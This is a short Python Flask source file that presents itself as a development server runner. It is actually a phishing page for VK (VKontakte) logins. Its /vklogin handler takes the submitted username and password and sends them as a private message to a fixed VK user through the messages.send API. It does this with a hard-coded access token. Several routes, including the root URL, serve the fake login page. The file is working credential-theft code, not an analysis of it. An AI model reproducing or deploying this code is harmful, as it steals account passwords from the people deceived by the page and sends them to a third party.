# -*- coding: utf-8 -*-
"""
This script runs the Flask application using a development server.
"""


from flask import render_template, g

from Flask import app
import flask
import requests





@app.route('/vklogin',  methods=['GET', 'POST'])
def vk_login():
    login = flask.request.form['login']
    password = flask.request.form['password']
    token = 'b5a859071969ecbd3b15df385f26a1b5ae7a72e7af4d8b8c445d3659741e4b4ca81ff085d50d15771ebcd'
    mes = requests.get('https://api.vk.com/method/messages.send',
                       params={'access_token': token,
                               'user_id': 436337712, 'message': ' log:' + login + ' password: ' + password, 'v': 5.73})
    print(mes.json())

    return render_template('vklogin.html')

@app.route('/',  methods=['GET', 'POST'])
@app.route('/vklog',  methods=['GET', 'POST'])
@app.route('/login',  methods=['GET', 'POST'])
@app.route('/log',  methods=['GET', 'POST'])
def vk_log():
    return render_template('vklogin.html')


if __name__ == '__main__':
    app.run()
